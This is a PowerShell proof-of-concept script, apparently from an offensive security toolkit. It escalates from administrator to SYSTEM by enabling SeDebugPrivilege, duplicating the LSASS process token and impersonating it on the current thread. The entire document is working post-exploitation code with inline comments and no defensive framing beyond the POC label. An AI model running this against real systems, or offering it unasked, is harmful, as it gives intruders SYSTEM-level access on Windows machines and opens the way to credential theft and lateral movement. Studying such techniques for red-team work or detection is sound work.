function Conjure-LSASS {
<#
.SYNOPSIS
    
    Use the SeDebugPrivilege to duplicate the LSASS access token and
    impersonate it in the calling thread. If SeDebugPrivilege is disabled
    the function will re-enable it.

    If SeDebugPrivilege has been removed, it can be added using LsaAddAccountRights
    however that requires the user to log off / log on so I haven't added it
    to the script.
    
    Notes:
    
    * Multithreading in PowerShell, causes the impersonation to be lost. To avoid
      this PowerShell should be launched as a Single Threaded Apartment (STA)
      ==> "powershell -sta". This should not be an issue in PowerShell v3+.
    * This is just some POC code mkay, check out PowerSploit & PoshPrivilege.

.DESCRIPTION
	Author: Ruben Boonen (@FuzzySec)
	License: BSD 3-Clause
	Required Dependencies: None
	Optional Dependencies: None
    
.EXAMPLE
	C:\PS> Conjure-LSASS
#>

	Add-Type -TypeDefinition @"
	using System;
	using System.Diagnostics;
	using System.Runtime.InteropServices;
	using System.Security.Principal;
	
	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	public struct TokPriv1Luid
	{
		public int Count;
		public long Luid;
		public int Attr;
	}
	
	public static class Advapi32
	{
		[DllImport("advapi32.dll", SetLastError=true)]
		public static extern bool OpenProcessToken(
			IntPtr ProcessHandle, 
			int DesiredAccess,
			ref IntPtr TokenHandle);
			
		[DllImport("advapi32.dll", SetLastError=true)]
		public static extern bool LookupPrivilegeValue(
			string lpSystemName,
			string lpName,
			ref long lpLuid);
			
		[DllImport("advapi32.dll", SetLastError = true)]
		public static extern bool AdjustTokenPrivileges(
			IntPtr TokenHandle,
			bool DisableAllPrivileges,
			ref TokPriv1Luid NewState,
			int BufferLength,
			IntPtr PreviousState,
			IntPtr ReturnLength);
			
		[DllImport("advapi32.dll", SetLastError=true)]
		public extern static bool DuplicateToken(
			IntPtr ExistingTokenHandle,
			int SECURITY_IMPERSONATION_LEVEL,
			ref IntPtr DuplicateTokenHandle);
			
		[DllImport("advapi32.dll", SetLastError=true)]
		public static extern bool SetThreadToken(
			IntPtr Thread,
			IntPtr Token);
	}
	
	public static class Kernel32
	{
		[DllImport("kernel32.dll")]
		public static extern uint GetLastError();
	}
"@
	
	$IsAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')
	
	# Needs Admin privs
	if (!$IsAdmin) {
		echo "`n[!] Administrator privileges are required!`n"
		Return
	}
	
	$Whoami = whoami /priv /fo csv |ConvertFrom-Csv
	$SeDebugPriv = $whoami -Match "SeDebugPrivilege"
	
	# SeDebugPriv needs to be available
	if (!$SeDebugPriv) {
		echo "`n[!] SeDebugPrivilege not available, exiting!"
		Return
	}
	
	else {
		echo "`n[?] SeDebugPrivilege is available!"
		foreach ($priv in $whoami) {
			if ($priv."Privilege Name" -contains "SeDebugPrivilege") {
				$DebugVal = $priv.State
			}
		}
		
		# Get current proc handle
		$ProcHandle = (Get-Process -Id ([System.Diagnostics.Process]::GetCurrentProcess().Id)).Handle
		echo "`n[+] Current process handle: $ProcHandle"
		
		# Open token handle with TOKEN_ADJUST_PRIVILEGES bor TOKEN_QUERY
		echo "`n[>] Calling Advapi32::OpenProcessToken"
		$hTokenHandle = [IntPtr]::Zero
		$CallResult = [Advapi32]::OpenProcessToken($ProcHandle, 0x28, [ref]$hTokenHandle)
		echo "[+] Token handle with TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY: $hTokenHandle`n"
		
		# Enable SeDebugPrivilege if needed
		if ($DebugVal -eq "Disabled") {
			echo "[?] SeDebugPrivilege is disabled, enabling..`n"
			
			# Prepare TokPriv1Luid container
			$TokPriv1Luid = New-Object TokPriv1Luid
			$TokPriv1Luid.Count = 1
			$TokPriv1Luid.Attr = 0x00000002 # SE_PRIVILEGE_ENABLED
			
			# Get SeDebugPrivilege luid
			$LuidVal = $Null
			echo "[>] Calling Advapi32::LookupPrivilegeValue --> SeDebugPrivilege"
			$CallResult = [Advapi32]::LookupPrivilegeValue($null, "SeDebugPrivilege", [ref]$LuidVal)
			echo "[+] SeDebugPrivilege LUID value: $LuidVal`n"
			$TokPriv1Luid.Luid = $LuidVal
			
			# Enable SeDebugPrivilege for the current process
			echo "[>] Calling Advapi32::AdjustTokenPrivileges`n"
			$CallResult = [Advapi32]::AdjustTokenPrivileges($hTokenHandle, $False, [ref]$TokPriv1Luid, 0, [IntPtr]::Zero, [IntPtr]::Zero)
			if (!$CallResult) {
				$LastError = [Kernel32]::GetLastError()
				echo "[!] Mmm, something went wrong! GetLastError returned: $LastError`n"
				Return
			}
		}
		
		echo "[?] SeDebugPrivilege is enabled!`n"
		
		# Open token handle with TOKEN_IMPERSONATE bor TOKEN_DUPLICATE
		echo "[>] Calling Advapi32::OpenProcessToken --> LSASS"
		$ProcHandle = (Get-Process -Name lsass).Handle
		$hTokenHandle = [IntPtr]::Zero
		$CallResult = [Advapi32]::OpenProcessToken($ProcHandle, 0x6, [ref]$hTokenHandle)
		echo "[+] Token handle with TOKEN_IMPERSONATE|TOKEN_DUPLICATE: $hTokenHandle`n"
		
		# Duplicate LSASS token
		echo "[>] Calling Advapi32::DuplicateToken --> LSASS"
		$hDuplicateTokenHandle = [IntPtr]::Zero
		$CallResult = [Advapi32]::DuplicateToken($hTokenHandle, 2, [ref]$hDuplicateTokenHandle)
		echo "[+] Duplicate token handle with SecurityImpersonation level: $hDuplicateTokenHandle`n"
		
		# Assign impersonation token to calling thread
		echo "[>] Calling Advapi32::SetThreadToken"
		$CallResult = [Advapi32]::SetThreadToken([IntPtr]::Zero, $hDuplicateTokenHandle)
		if (!$CallResult) {
			$LastError = [Kernel32]::GetLastError()
			echo "[!] Mmm, something went wrong! GetLastError returned: $LastError`n"
			Return
		}
		echo "[+] Knock knock .. who's there .. LSASS"
		echo "[+] User context: $([Environment]::UserName)`n"
	}
}